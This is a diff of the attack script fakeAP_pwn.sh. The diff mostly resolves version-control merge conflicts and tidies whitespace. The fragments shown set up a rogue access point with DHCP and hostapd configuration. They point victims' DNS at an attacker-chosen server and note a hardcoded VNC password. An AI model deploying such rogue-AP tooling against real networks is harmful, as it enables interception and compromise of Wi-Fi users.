@@ -1,10 +1,6 @@
 #!/bin/bash                                                                                    #
 # (C)opyright 2010 - g0tmi1k & joker5bb                                                        #
-<<<<<<< .mine
-# fakeAP_pwn.sh v0.3 (Beta-#68 2010-07-30)                                                     #
-=======
-# fakeAP_pwn.sh v0.3 (Beta-#67 2010-07-30)                                                     #
->>>>>>> .r67
+# fakeAP_pwn.sh v0.3 (Beta-#69 2010-07-30)                                                     #
 #---Important----------------------------------------------------------------------------------#
 # Make sure to copy "www": cp -rf www/* /var/www/fakeAP_pwn                                    #
 # The VNC password is "g0tmi1k" (without "")                                                   #
@@ -74,11 +70,7 @@ verbose=0
 gatewayIP=$(route -n | awk '/^0.0.0.0/ {getline; print $2}')
     ourIP=$(ifconfig $interface | awk '/inet addr/ {split ($2,A,":"); print A[2]}')
      port=$(shuf -i 2000-65000 -n 1)
-<<<<<<< .mine
-  version="0.3 (Beta-#68)"
-=======
-  version="0.3 (Beta-#67)"
->>>>>>> .r67
+  version="0.3 (Beta-#69)"
       www="${www%/}"
 trap 'cleanup interrupt' 2 # Interrupt - "Ctrl + C"
 
@@ -978,12 +970,12 @@ subnet 10.0.0.0 netmask 255.255.255.0 {
   option subnet-mask 255.255.255.0;
   option broadcast-address 10.0.0.255;
   option domain-name \"Home.com\";" > /tmp/fakeAP_pwn.dhcp
-if [ "$apMode" == "transparent" ] || [ "$apMode" == "normal" ] ; then 
-    echo "  option domain-name-servers $gatewayIP;" >> /tmp/fakeAP_pwn.dhcp 
+if [ "$apMode" == "transparent" ] || [ "$apMode" == "normal" ] ; then
+    echo "  option domain-name-servers $gatewayIP;" >> /tmp/fakeAP_pwn.dhcp
 elif [ "$apMode" == "non" ] ; then
     echo "  option domain-name-servers 10.0.0.1;" >> /tmp/fakeAP_pwn.dhcp
 fi
-echo "  option netbios-name-servers 10.0.0.100;  
+echo "  option netbios-name-servers 10.0.0.100;
 }" >> /tmp/fakeAP_pwn.dhcp
 if [ "$verbose" == "2" ]  ; then echo "Created: /tmp/fakeAP_pwn.dhcp"; fi
 if [ "$debug" == "true" ] ; then cat /tmp/fakeAP_pwn.dhcp; fi
@@ -1125,18 +1117,9 @@ own_ip_addr=127.0.0.1
 #wmm_ac_vo_cwmax=3
 #wmm_ac_vo_txop_limit=47
 #wmm_ac_vo_acm=0
-<<<<<<< .mine
 #enable_karma=1
 #accept_mac_file=/etc/hostapd/hostapd.accept
 #deny_mac_file=/etc/hostapd/hostapd.deny" > /tmp/fakeAP_pwn.hostapd
-=======
-eapol_key_index_workaround=0
-eap_server=0
-own_ip_addr=127.0.0.1
-#enable_karma=1
-#accept_mac_file=/etc/hostapd/hostapd.accept
-#deny_mac_file=/etc/hostapd/hostapd.deny" > /tmp/fakeAP_pwn.hostapd
->>>>>>> .r67
    if [ "$verbose" == "2" ]  ; then echo "Created: /tmp/fakeAP_pwn.hostapd"; fi
    if [ "$debug" == "true" ] ; then cat /tmp/fakeAP_pwn.hostapd; fi
 fi
